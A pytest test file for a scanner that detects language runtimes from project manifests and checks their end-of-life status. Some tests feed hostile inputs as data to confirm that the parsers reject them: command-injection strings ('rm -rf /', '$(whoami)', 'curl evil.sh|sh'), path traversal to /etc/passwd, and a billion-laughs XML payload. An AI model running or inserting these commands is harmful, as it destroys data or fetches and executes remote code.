"""Tests for the endoflife.date-backed runtime EOL/support-status scanner."""

from __future__ import annotations

import json
import os
import subprocess
import time

import pytest

from dev_team.eolscan import (
    _PARSERS,
    EolScan,
    EolStatus,
    Runtime,
    _cycle_candidates,
    _eol_verdict,
    _http_fetch,
    _match_cycle,
    detect_runtimes,
    parse_composer_json_php,
    parse_global_json_sdk,
    parse_go_mod,
    parse_gradle_java,
    parse_nvmrc,
    parse_package_json_engines,
    parse_pom_xml_java,
    parse_python_version,
    parse_ruby_version,
    parse_runtime_txt,
    parse_rust_toolchain_legacy,
    parse_rust_toolchain_toml,
    query_eol,
    scan_eol,
)
from dev_team.execution import InMemoryWorkspace

_PAST_EOL = "2000-01-01"
_FUTURE_EOL = "2999-01-01"


# --- parsers: well-formed, malformed, never raise ---------------------------------


def test_parse_package_json_engines():
    text = json.dumps({"engines": {"node": "^18.17.0"}})
    assert parse_package_json_engines(text) == ("nodejs", "18.17.0")


def test_parse_package_json_engines_range_and_x_range():
    assert parse_package_json_engines(
        json.dumps({"engines": {"node": ">=18.0.0 <19.0.0"}})
    ) == ("nodejs", "18.0.0")
    assert parse_package_json_engines(json.dumps({"engines": {"node": "18.x"}})) == (
        "nodejs",
        "18",
    )


def test_parse_package_json_engines_malformed_never_raises():
    assert parse_package_json_engines("not json") is None
    assert parse_package_json_engines("[]") is None
    assert parse_package_json_engines("{}") is None
    assert parse_package_json_engines(json.dumps({"engines": "nope"})) is None
    assert parse_package_json_engines(json.dumps({"engines": {"node": 18}})) is None
    assert parse_package_json_engines(json.dumps({"engines": {"node": "lts"}})) is None
    assert parse_package_json_engines("") is None


def test_parse_nvmrc():
    assert parse_nvmrc("v18.17.0\n") == ("nodejs", "18.17.0")
    assert parse_nvmrc("18") == ("nodejs", "18")


def test_parse_nvmrc_malformed_never_raises():
    assert parse_nvmrc("lts/hydrogen") is None
    assert parse_nvmrc("") is None
    assert parse_nvmrc("   \n") is None


def test_parse_runtime_txt():
    assert parse_runtime_txt("python-3.11.4\n") == ("python", "3.11.4")


def test_parse_runtime_txt_malformed_never_raises():
    assert parse_runtime_txt("ruby-3.2.0") is None
    assert parse_runtime_txt("") is None
    assert parse_runtime_txt("python-") is None


def test_parse_python_version():
    assert parse_python_version("3.11.4\n") == ("python", "3.11.4")
    assert parse_python_version("3.11.4\n3.10.0\n") == ("python", "3.11.4")


def test_parse_python_version_malformed_never_raises():
    assert parse_python_version("") is None
    assert parse_python_version("   \n") is None
    assert parse_python_version("system") is None


def test_parse_global_json_sdk():
    text = json.dumps({"sdk": {"version": "8.0.100"}})
    assert parse_global_json_sdk(text) == ("dotnet", "8.0.100")


def test_parse_global_json_sdk_malformed_never_raises():
    assert parse_global_json_sdk("not json") is None
    assert parse_global_json_sdk("[]") is None
    assert parse_global_json_sdk(json.dumps({"sdk": "nope"})) is None
    assert parse_global_json_sdk(json.dumps({"sdk": {}})) is None
    assert parse_global_json_sdk(json.dumps({"sdk": {"version": 8}})) is None
    assert parse_global_json_sdk("") is None


def test_parse_ruby_version():
    assert parse_ruby_version("3.2.0\n") == ("ruby", "3.2.0")
    assert parse_ruby_version("3.2.0\n3.1.0\n") == ("ruby", "3.2.0")


def test_parse_ruby_version_malformed_never_raises():
    assert parse_ruby_version("") is None
    assert parse_ruby_version("   \n") is None
    assert parse_ruby_version("system") is None


def test_parse_go_mod():
    assert parse_go_mod("module example.com/foo\n\ngo 1.21\n") == ("go", "1.21")
    assert parse_go_mod("module example.com/foo\n\ngo 1.21.3\n") == ("go", "1.21.3")


def test_parse_go_mod_malformed_never_raises():
    assert parse_go_mod("module example.com/foo\n") is None  # no go directive
    assert parse_go_mod("") is None
    assert parse_go_mod("module example.com/foo\n\ngo unknown\n") is None


def test_parse_composer_json_php():
    text = json.dumps({"require": {"php": "^8.1"}})
    assert parse_composer_json_php(text) == ("php", "8.1")


def test_parse_composer_json_php_range_spec_tolerance():
    assert parse_composer_json_php(
        json.dumps({"require": {"php": ">=7.4"}})
    ) == ("php", "7.4")
    assert parse_composer_json_php(
        json.dumps({"require": {"php": "8.1.*"}})
    ) == ("php", "8.1")
    assert parse_composer_json_php(
        json.dumps({"require": {"php": "~8.2.0"}})
    ) == ("php", "8.2.0")
    assert parse_composer_json_php(
        json.dumps({"require": {"php": "^8.1 || ^8.2"}})
    ) == ("php", "8.1")


def test_parse_composer_json_php_malformed_never_raises():
    assert parse_composer_json_php("not json") is None
    assert parse_composer_json_php("[]") is None
    assert parse_composer_json_php("{}") is None
    assert parse_composer_json_php(json.dumps({"require": "nope"})) is None
    assert parse_composer_json_php(
        json.dumps({"require": {"ext-mbstring": "*"}})
    ) is None
    assert parse_composer_json_php(
        json.dumps({"require": {"php": 8}})
    ) is None
    assert parse_composer_json_php("") is None


_POM_NS = "http://maven.apache.org/POM/4.0.0"


def _pom(properties_xml="", *, namespaced=True, extra="", tag="project"):
    xmlns = f' xmlns="{_POM_NS}"' if namespaced else ""
    return f"<{tag}{xmlns}>{extra}<properties>{properties_xml}</properties></{tag}>"


def test_parse_pom_xml_java_well_formed_namespaced():
    text = _pom("<maven.compiler.release>17</maven.compiler.release>")
    assert parse_pom_xml_java(text) == ("java", "17")


def test_parse_pom_xml_java_priority_release_over_java_version():
    text = _pom(
        "<maven.compiler.release>17</maven.compiler.release>"
        "<java.version>11</java.version>"
    )
    assert parse_pom_xml_java(text) == ("java", "17")


def test_parse_pom_xml_java_priority_java_version_over_target():
    text = _pom(
        "<java.version>11</java.version>"
        "<maven.compiler.target>1.8</maven.compiler.target>"
    )
    assert parse_pom_xml_java(text) == ("java", "11")


def test_parse_pom_xml_java_priority_target_over_source():
    text = _pom(
        "<maven.compiler.target>17</maven.compiler.target>"
        "<maven.compiler.source>1.8</maven.compiler.source>"
    )
    assert parse_pom_xml_java(text) == ("java", "17")


def test_parse_pom_xml_java_source_alone():
    text = _pom("<maven.compiler.source>11</maven.compiler.source>")
    assert parse_pom_xml_java(text) == ("java", "11")


def test_parse_pom_xml_java_legacy_1_x_normalises():
    text = _pom("<maven.compiler.source>1.8</maven.compiler.source>")
    assert parse_pom_xml_java(text) == ("java", "8")


def test_parse_pom_xml_java_modern_version_passes_through():
    text = _pom("<java.version>21</java.version>")
    assert parse_pom_xml_java(text) == ("java", "21")


def test_parse_pom_xml_java_no_properties_element():
    text = f'<project xmlns="{_POM_NS}"><groupId>x</groupId></project>'
    assert parse_pom_xml_java(text) is None


def test_parse_pom_xml_java_properties_with_no_recognised_keys():
    text = _pom("<other.thing>1</other.thing>")
    assert parse_pom_xml_java(text) is None


def test_parse_pom_xml_java_empty_document():
    assert parse_pom_xml_java("") is None


def test_parse_pom_xml_java_non_version_shaped_value_falls_through():
    text = _pom(
        "<maven.compiler.release>${revision}</maven.compiler.release>"
        "<java.version>11</java.version>"
    )
    assert parse_pom_xml_java(text) == ("java", "11")


def test_parse_pom_xml_java_non_version_shaped_value_with_no_fallback_is_none():
    text = _pom("<maven.compiler.release>${revision}</maven.compiler.release>")
    assert parse_pom_xml_java(text) is None


def test_parse_pom_xml_java_empty_property_text_falls_through():
    text = _pom(
        "<maven.compiler.release></maven.compiler.release>"
        "<maven.compiler.source>11</maven.compiler.source>"
    )
    assert parse_pom_xml_java(text) == ("java", "11")


def test_parse_pom_xml_java_malformed_never_raises():
    assert parse_pom_xml_java("<project><properties>") is None  # truncated
    assert parse_pom_xml_java("not xml at all \x00\x01") is None  # non-XML bytes
    assert parse_pom_xml_java("<not-even-xml") is None


def test_parse_pom_xml_java_multibyte_encoding_declaration_never_raises(monkeypatch):
    # A `pom.xml` whose XML declaration names a multi-byte encoding (e.g.
    # `encoding="UTF-16"`) fed as a `str` — exactly what workspace.read_text
    # hands this function — makes CPython's expat binding raise a bare
    # `ValueError: multi-byte encodings are not supported`, not
    # `ET.ParseError`. That's not reliably reproducible across expat/CPython
    # builds, so pin the contract directly: force `ET.fromstring` to raise
    # `ValueError` and assert it degrades to `None` rather than propagating,
    # both directly and via detect_runtimes.
    import dev_team.eolscan as eolscan

    def _raise_value_error(text):
        raise ValueError("multi-byte encodings are not supported")

    monkeypatch.setattr(eolscan.ET, "fromstring", _raise_value_error)

    text = _pom("<java.version>17</java.version>")
    assert parse_pom_xml_java(text) is None
    ws = InMemoryWorkspace({"pom.xml": text})
    assert detect_runtimes(ws) == []


def test_parse_pom_xml_java_billion_laughs_never_raises():
    # Classic 9-level "billion laughs" entity expansion inside <properties>:
    # expat's built-in amplification-attack protection surfaces this as
    # ET.ParseError, which this parser already catches — assert it degrades
    # to None, not a crash or a resource-exhausting hang, both directly and
    # via detect_runtimes.
    payload = (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE properties [\n"
        ' <!ENTITY lol1 "1234567890">\n'
        ' <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n'
        ' <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
        ' <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n'
        ' <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n'
        ' <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n'
        ' <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n'
        ' <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n'
        ' <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n'
        "]>\n"
        f'<project xmlns="{_POM_NS}"><properties>'
        "<java.version>&lol9;</java.version>"
        "</properties></project>\n"
    )
    assert parse_pom_xml_java(payload) is None
    ws = InMemoryWorkspace({"pom.xml": payload})
    assert detect_runtimes(ws) == []


def test_parse_pom_xml_java_profile_scoped_properties_not_read():
    # Only the top-level <properties> is read — a <profile>-scoped override
    # is conditionally activated and this module has no build context to
    # evaluate it, so it must never be picked up as a fallback.
    text = (
        f'<project xmlns="{_POM_NS}">'
        "<properties><maven.compiler.release>17</maven.compiler.release></properties>"
        "<profiles><profile><properties>"
        "<maven.compiler.release>21</maven.compiler.release>"
        "</properties></profile></profiles>"
        "</project>"
    )
    assert parse_pom_xml_java(text) == ("java", "17")


def test_crafted_pom_xml_property_value_never_parses_to_a_version():
    malicious = ["$(rm -rf /)", "../../etc/passwd", "; rm -rf /", "`id`"]
    for spec in malicious:
        text = _pom(f"<java.version>{spec}</java.version>")
        assert parse_pom_xml_java(text) is None


def test_detect_runtimes_java_from_pom_xml():
    text = _pom("<maven.compiler.release>17</maven.compiler.release>")
    ws = InMemoryWorkspace({"pom.xml": text})
    runtimes = detect_runtimes(ws)
    assert runtimes == [Runtime(product="java", version="17", manifest="pom.xml")]


def test_detect_runtimes_java_alongside_another_product_no_cross_interference():
    ws = InMemoryWorkspace(
        {
            "pom.xml": _pom("<java.version>17</java.version>"),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("java", "17", "pom.xml"),
    ]


def test_detect_runtimes_no_pom_xml_unchanged_by_java_support():
    ws = InMemoryWorkspace(
        {
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("php", "8.1", "composer.json"),
    ]


def test_scan_eol_reports_status_for_java():
    ws = InMemoryWorkspace(
        {"pom.xml": _pom("<maven.compiler.release>17</maven.compiler.release>")}
    )

    def fetch(product):
        assert product == "java"
        return [{"cycle": "17", "eol": _FUTURE_EOL}]

    scan = scan_eol(ws, fetch=fetch)
    assert scan.queried is True
    by_product = {s.runtime.product: s for s in scan.statuses}
    assert by_product["java"].end_of_life is False
    rendered = scan.render()
    assert "Java 17 (pom.xml)" in rendered
    assert "supported" in rendered


# --- parse_gradle_java --------------------------------------------------------------


def test_parse_gradle_java_toolchain():
    text = "java {\n  toolchain {\n    languageVersion = JavaLanguageVersion.of(17)\n  }\n}\n"
    assert parse_gradle_java(text) == ("java", "17")


def test_parse_gradle_java_toolchain_wins_over_source_compatibility():
    text = (
        "java { toolchain { languageVersion = JavaLanguageVersion.of(17) } }\n"
        "sourceCompatibility = '11'\n"
    )
    assert parse_gradle_java(text) == ("java", "17")


def test_parse_gradle_java_source_wins_over_target_when_both_present():
    text = "sourceCompatibility = '17'\ntargetCompatibility = '11'\n"
    assert parse_gradle_java(text) == ("java", "17")


def test_parse_gradle_java_target_alone_is_used():
    text = "targetCompatibility = '17'\n"
    assert parse_gradle_java(text) == ("java", "17")


@pytest.mark.parametrize(
    "snippet,expected",
    [
        ("sourceCompatibility = '17'", ("java", "17")),
        ("sourceCompatibility = 17", ("java", "17")),
        ("sourceCompatibility = JavaVersion.VERSION_17", ("java", "17")),
        ("sourceCompatibility = JavaVersion.VERSION_1_8", ("java", "8")),
        ("sourceCompatibility = 1.8", ("java", "8")),
    ],
)
def test_parse_gradle_java_value_forms(snippet, expected):
    assert parse_gradle_java(snippet) == expected


@pytest.mark.parametrize(
    "snippet,expected",
    [
        ("sourceCompatibility = '17'", ("java", "17")),
        ("sourceCompatibility = 17", ("java", "17")),
        ("sourceCompatibility = JavaVersion.VERSION_17", ("java", "17")),
    ],
)
def test_parse_gradle_java_value_forms_kotlin_dsl_dialect_agnostic(snippet, expected):
    # Kotlin DSL syntax for these three forms is identical to Groovy's
    # `=`-assignment form -- confirms the parser is dialect-agnostic for
    # the forms it covers, exercised against .kts-flavoured surrounding
    # content (typed block receivers, no semicolons required either way).
    text = f"java {{\n    {snippet}\n}}\n"
    assert parse_gradle_java(text) == expected


def test_parse_gradle_java_no_match_out_of_scope_forms_returns_none():
    # Deliberately out-of-scope forms: legacy Groovy space-call (no `=`)
    # and a value sourced from a variable/`ext` block -- neither is
    # guessed at.
    assert parse_gradle_java("sourceCompatibility JavaVersion.VERSION_17") is None
    assert parse_gradle_java("sourceCompatibility = javaVersion") is None
    assert parse_gradle_java("targetCompatibility = project.ext.javaVersion") is None


def test_parse_gradle_java_empty_file_is_none():
    assert parse_gradle_java("") is None


def test_parse_gradle_java_unrelated_dsl_no_version_directive_is_none():
    text = "plugins {\n  id 'java'\n}\n\nrepositories {\n  mavenCentral()\n}\n"
    assert parse_gradle_java(text) is None


def test_parse_gradle_java_adversarial_input_never_raises_and_returns_promptly():
    # A very large file with deeply repeated/nested-looking text designed
    # to probe catastrophic regex backtracking, plus non-UTF8-decodable
    # bytes reaching this function as a `str` via mis-decoding (the shape
    # `workspace.read_text` can hand a parser). The compiled patterns use
    # only bounded digit groups with no nested/overlapping quantifiers, so
    # this should resolve in linear time, not hang.
    hostile = "sourceCompatibility" * 5000 + "=" * 5000 + "(" * 5000
    hostile += "".join(chr(0xDC00 + (i % 256)) for i in range(2000))  # lone surrogates
    start = time.monotonic()
    result = parse_gradle_java(hostile)
    elapsed = time.monotonic() - start
    assert result is None
    assert elapsed < 5.0

    ws = InMemoryWorkspace({"build.gradle": hostile})
    start = time.monotonic()
    runtimes = detect_runtimes(ws)
    elapsed = time.monotonic() - start
    assert runtimes == []
    assert elapsed < 5.0


def test_gradle_parsers_registered():
    assert _PARSERS["build.gradle"] is parse_gradle_java
    assert _PARSERS["build.gradle.kts"] is parse_gradle_java


def test_detect_runtimes_java_from_build_gradle():
    ws = InMemoryWorkspace({"build.gradle": "sourceCompatibility = '17'\n"})
    assert detect_runtimes(ws) == [
        Runtime(product="java", version="17", manifest="build.gradle")
    ]


def test_detect_runtimes_java_from_build_gradle_kts_only():
    ws = InMemoryWorkspace({"build.gradle.kts": "sourceCompatibility = \"17\"\n"})
    assert detect_runtimes(ws) == [
        Runtime(product="java", version="17", manifest="build.gradle.kts")
    ]


def test_detect_runtimes_no_gradle_file_unchanged_by_gradle_support():
    ws = InMemoryWorkspace(
        {
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("php", "8.1", "composer.json"),
    ]


def test_detect_runtimes_pom_and_gradle_both_present_dedupes_to_one_java_runtime():
    # An unusual but real hybrid-migration state: both build files present.
    # `detect_runtimes`'s existing per-product dedup picks whichever
    # manifest sorts first by path -- "build.gradle" < "pom.xml".
    ws = InMemoryWorkspace(
        {
            "pom.xml": _pom("<java.version>11</java.version>"),
            "build.gradle": "sourceCompatibility = '17'\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert runtimes == [
        Runtime(product="java", version="17", manifest="build.gradle")
    ]


# --- parse_rust_toolchain_toml ----------------------------------------------------


def test_parse_rust_toolchain_toml_concrete_version():
    text = '[toolchain]\nchannel = "1.75.0"\n'
    assert parse_rust_toolchain_toml(text) == ("rust", "1.75.0")


def test_parse_rust_toolchain_toml_two_component_version():
    text = '[toolchain]\nchannel = "1.75"\n'
    assert parse_rust_toolchain_toml(text) == ("rust", "1.75")


@pytest.mark.parametrize("channel", ["stable", "beta", "nightly"])
def test_parse_rust_toolchain_toml_named_channel_is_none(channel):
    text = f'[toolchain]\nchannel = "{channel}"\n'
    assert parse_rust_toolchain_toml(text) is None


def test_parse_rust_toolchain_toml_dated_nightly_is_none():
    # Leads with letters, not a dotted-numeric version -- `_leading_version`
    # correctly degrades this rather than misparsing "2024" as the version.
    text = '[toolchain]\nchannel = "nightly-2024-01-15"\n'
    assert parse_rust_toolchain_toml(text) is None


def test_parse_rust_toolchain_toml_malformed_never_raises():
    assert parse_rust_toolchain_toml("[toolchain") is None  # truncated TOML
    assert parse_rust_toolchain_toml("not toml at all ===") is None
    assert parse_rust_toolchain_toml("") is None


def test_parse_rust_toolchain_toml_missing_toolchain_table_is_none():
    assert parse_rust_toolchain_toml('[profile]\nname = "default"\n') is None


def test_parse_rust_toolchain_toml_missing_channel_is_none():
    assert parse_rust_toolchain_toml('[toolchain]\ncomponents = ["rustfmt"]\n') is None


def test_parse_rust_toolchain_toml_non_string_channel_is_none():
    assert parse_rust_toolchain_toml("[toolchain]\nchannel = 175\n") is None


def test_rust_toolchain_toml_parser_registered():
    assert _PARSERS["rust-toolchain.toml"] is parse_rust_toolchain_toml


def test_rust_added_to_display_names_and_supported_products():
    import dev_team.eolscan as eolscan

    assert eolscan._DISPLAY_NAMES["rust"] == "Rust"
    assert "rust" in eolscan._SUPPORTED_PRODUCTS


def test_detect_runtimes_rust_from_rust_toolchain_toml():
    ws = InMemoryWorkspace({"rust-toolchain.toml": '[toolchain]\nchannel = "1.75.0"\n'})
    assert detect_runtimes(ws) == [
        Runtime(product="rust", version="1.75.0", manifest="rust-toolchain.toml")
    ]


def test_detect_runtimes_rust_alongside_another_product_no_cross_interference():
    ws = InMemoryWorkspace(
        {
            "rust-toolchain.toml": '[toolchain]\nchannel = "1.75.0"\n',
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("rust", "1.75.0", "rust-toolchain.toml"),
    ]


def test_detect_runtimes_no_rust_toolchain_toml_unchanged_by_rust_support():
    ws = InMemoryWorkspace(
        {
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("php", "8.1", "composer.json"),
    ]


def test_scan_eol_reports_status_for_rust():
    ws = InMemoryWorkspace(
        {"rust-toolchain.toml": '[toolchain]\nchannel = "1.75.0"\n'}
    )

    def fetch(product):
        assert product == "rust"
        return [{"cycle": "1.75", "eol": _FUTURE_EOL}]

    scan = scan_eol(ws, fetch=fetch)
    assert scan.queried is True
    by_product = {s.runtime.product: s for s in scan.statuses}
    assert by_product["rust"].end_of_life is False
    rendered = scan.render()
    assert "Rust 1.75.0 (rust-toolchain.toml)" in rendered
    assert "supported" in rendered


def test_crafted_rust_toolchain_channel_never_parses_to_a_version():
    malicious = ["; rm -rf /", "../../etc/passwd", "$(whoami)", "`id`"]
    for channel in malicious:
        text = f'[toolchain]\nchannel = "{channel}"\n'
        assert parse_rust_toolchain_toml(text) is None


def test_detect_runtimes_seven_prior_products_unaffected_by_rust_support():
    # Regression guard: adding an eighth product must not change detection
    # for the seven products already registered before this change.
    ws = InMemoryWorkspace(
        {
            ".nvmrc": "18.17.0",
            ".python-version": "3.11.4",
            "global.json": json.dumps({"sdk": {"version": "8.0.100"}}),
            ".ruby-version": "3.2.0",
            "go.mod": "module example.com/foo\n\ngo 1.21.3\n",
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "pom.xml": _pom("<maven.compiler.release>17</maven.compiler.release>"),
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version) for r in runtimes) == [
        ("dotnet", "8.0.100"),
        ("go", "1.21.3"),
        ("java", "17"),
        ("nodejs", "18.17.0"),
        ("php", "8.1"),
        ("python", "3.11.4"),
        ("ruby", "3.2.0"),
    ]


# --- parse_rust_toolchain_legacy ----------------------------------------------------


def test_parse_rust_toolchain_legacy_concrete_version():
    assert parse_rust_toolchain_legacy("1.75.0\n") == ("rust", "1.75.0")


def test_parse_rust_toolchain_legacy_two_component_version():
    assert parse_rust_toolchain_legacy("1.75\n") == ("rust", "1.75")


def test_parse_rust_toolchain_legacy_target_triple_suffix_stripped():
    assert parse_rust_toolchain_legacy("1.75.0-x86_64-unknown-linux-gnu\n") == (
        "rust",
        "1.75.0",
    )


@pytest.mark.parametrize("channel", ["stable\n", "stable-x86_64-unknown-linux-gnu\n"])
def test_parse_rust_toolchain_legacy_named_channel_is_none(channel):
    assert parse_rust_toolchain_legacy(channel) is None


def test_parse_rust_toolchain_legacy_dated_nightly_is_none():
    assert parse_rust_toolchain_legacy("nightly-2024-01-15\n") is None


def test_parse_rust_toolchain_legacy_empty_or_whitespace_only_is_none():
    assert parse_rust_toolchain_legacy("") is None
    assert parse_rust_toolchain_legacy("   \n") is None


def test_parse_rust_toolchain_legacy_pathological_input_never_raises_or_queries():
    payload = "; rm -rf /`id`../../etc/passwd$(whoami)&&curl evil.sh|sh;" * 200
    assert len(payload) > 10_000
    assert parse_rust_toolchain_legacy(payload) is None

    ws = InMemoryWorkspace({"rust-toolchain": payload})

    def fetch(_product):
        raise AssertionError("must not query endoflife.date for an undetected runtime")

    scan = scan_eol(ws, fetch=fetch)
    assert scan.runtimes == []
    assert scan.queried is False


def test_rust_toolchain_legacy_parser_registered():
    assert _PARSERS["rust-toolchain"] is parse_rust_toolchain_legacy


def test_detect_runtimes_rust_from_legacy_rust_toolchain_file():
    ws = InMemoryWorkspace({"rust-toolchain": "1.75.0\n"})
    assert detect_runtimes(ws) == [
        Runtime(product="rust", version="1.75.0", manifest="rust-toolchain")
    ]


def test_detect_runtimes_no_legacy_rust_toolchain_unchanged_by_its_support():
    ws = InMemoryWorkspace(
        {
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("php", "8.1", "composer.json"),
    ]


# --- detect_runtimes ----------------------------------------------------------------


def test_detect_runtimes_dedupes_across_agreeing_files():
    ws = InMemoryWorkspace(
        {
            ".nvmrc": "18.17.0",
            "package.json": json.dumps({"engines": {"node": "18.17.0"}}),
        }
    )
    runtimes = detect_runtimes(ws)
    assert [(r.product, r.version) for r in runtimes] == [("nodejs", "18.17.0")]


def test_detect_runtimes_empty_workspace():
    assert detect_runtimes(InMemoryWorkspace({"README.md": "hi"})) == []


def test_detect_runtimes_multiple_products():
    ws = InMemoryWorkspace(
        {
            ".nvmrc": "18.17.0",
            ".python-version": "3.11.4",
            "global.json": json.dumps({"sdk": {"version": "8.0.100"}}),
            ".ruby-version": "3.2.0",
            "go.mod": "module example.com/foo\n\ngo 1.21.3\n",
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version) for r in runtimes) == [
        ("dotnet", "8.0.100"),
        ("go", "1.21.3"),
        ("nodejs", "18.17.0"),
        ("php", "8.1"),
        ("python", "3.11.4"),
        ("ruby", "3.2.0"),
    ]


def test_detect_runtimes_php_alongside_another_product_no_cross_interference():
    ws = InMemoryWorkspace(
        {
            "composer.json": json.dumps({"require": {"php": "^8.1"}}),
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version, r.manifest) for r in runtimes) == [
        ("go", "1.21", "go.mod"),
        ("php", "8.1", "composer.json"),
    ]


def test_detect_runtimes_dedupes_ruby_and_go_alone():
    ws = InMemoryWorkspace(
        {
            ".ruby-version": "3.2.0",
            "go.mod": "module example.com/foo\n\ngo 1.21\n",
        }
    )
    runtimes = detect_runtimes(ws)
    assert sorted((r.product, r.version) for r in runtimes) == [
        ("go", "1.21"),
        ("ruby", "3.2.0"),
    ]


def test_detect_runtimes_skips_recognised_file_with_malformed_content():
    ws = InMemoryWorkspace(
        {".nvmrc": "lts/hydrogen", ".python-version": "3.11.4"}
    )
    runtimes = detect_runtimes(ws)
    assert [(r.product, r.version) for r in runtimes] == [("python", "3.11.4")]


def test_detect_runtimes_never_returns_unsupported_product(monkeypatch):
    import dev_team.eolscan as eolscan

    monkeypatch.setitem(
        eolscan._PARSERS, "weird.txt", lambda text: ("rustlang", "1.0.0")
    )
    ws = InMemoryWorkspace({"weird.txt": "anything"})
    assert detect_runtimes(ws) == []


def test_detect_runtimes_tolerates_unreadable_file():
    class _Flaky(InMemoryWorkspace):
        def read_text(self, path):
            raise OSError("nope")

    assert detect_runtimes(_Flaky({".nvmrc": "18"})) == []


# --- cycle matching -------------------------------------------------------------


def test_cycle_candidates_order_most_specific_first():
    assert _cycle_candidates("18.17.0") == ["18.17.0", "18.17", "18"]
    assert _cycle_candidates("8") == ["8"]


def test_match_cycle_by_major_only():
    cycles = [{"cycle": "18", "eol": _FUTURE_EOL}, {"cycle": "16", "eol": _PAST_EOL}]
    assert _match_cycle("18.17.0", cycles) == cycles[0]


def test_match_cycle_by_major_minor():
    cycles = [{"cycle": "3.11", "eol": _FUTURE_EOL}]
    assert _match_cycle("3.11.4", cycles) == cycles[0]


def test_match_cycle_no_match_returns_none():
    cycles = [{"cycle": "18", "eol": _FUTURE_EOL}]
    assert _match_cycle("99.0.0", cycles) is None


def test_match_cycle_tolerates_non_list_and_non_dict_entries():
    assert _match_cycle("18.0.0", "not a list") is None
    assert _match_cycle("18.0.0", ["not a dict", {"no": "cycle field"}]) is None
    assert _match_cycle("18.0.0", [{"cycle": None}]) is None


# --- boundary: eol verdicts -----------------------------------------------------


def test_eol_verdict_past_date_is_end_of_life():
    assert _eol_verdict({"eol": _PAST_EOL}) == (True, _PAST_EOL)


def test_eol_verdict_future_date_is_supported():
    assert _eol_verdict({"eol": _FUTURE_EOL}) == (False, _FUTURE_EOL)


def test_eol_verdict_false_means_no_planned_eol():
    assert _eol_verdict({"eol": False}) == (False, None)


def test_eol_verdict_ambiguous_shapes_degrade_to_unknown():
    assert _eol_verdict({}) == ("unknown", None)
    assert _eol_verdict({"eol": True}) == ("unknown", None)
    assert _eol_verdict({"eol": "not-a-date"}) == ("unknown", None)
    assert _eol_verdict({"eol": ""}) == ("unknown", None)
    assert _eol_verdict({"eol": 123}) == ("unknown", None)


# --- query_eol -------------------------------------------------------------------


def test_query_eol_resolves_matching_cycle():
    def fetch(product):
        assert product == "nodejs"
        return [{"cycle": "18", "eol": _PAST_EOL}]

    assert query_eol("nodejs", "18.17.0", fetch=fetch) == (True, _PAST_EOL)


def test_query_eol_unknown_when_cycle_not_in_response():
    def fetch(_product):
        return [{"cycle": "16", "eol": _PAST_EOL}]

    assert query_eol("nodejs", "99.0.0", fetch=fetch) == ("unknown", None)


def test_query_eol_raises_on_non_list_response():
    with pytest.raises(ValueError):
        query_eol("nodejs", "18.0.0", fetch=lambda _p: {"not": "a list"})


# --- scan_eol: the degrade contract ----------------------------------------------


def test_scan_eol_reports_statuses_for_detected_runtimes():
    ws = InMemoryWorkspace(
        {
            ".nvmrc": "18.17.0",
            ".python-version": "3.11.4",
            "global.json": json.dumps({"sdk": {"version": "8.0.100"}}),
        }
    )

    def fetch(product):
        if product == "nodejs":
            return [{"cycle": "18", "eol": _PAST_EOL}]
        if product == "python":
            return [{"cycle": "3.11", "eol": _FUTURE_EOL}]
        return [{"cycle": "6.0", "eol": _FUTURE_EOL}]  # no cycle "8.0" -> unmatched

    scan = scan_eol(ws, fetch=fetch)
    assert scan.queried is True
    assert scan.error is None
    by_product = {s.runtime.product: s for s in scan.statuses}
    assert by_product["nodejs"].end_of_life is True
    assert by_product["nodejs"].eol_date == _PAST_EOL
    assert by_product["python"].end_of_life is False
    assert by_product["dotnet"].end_of_life == "unknown"
    rendered = scan.render()
    assert "END OF LIFE" in rendered
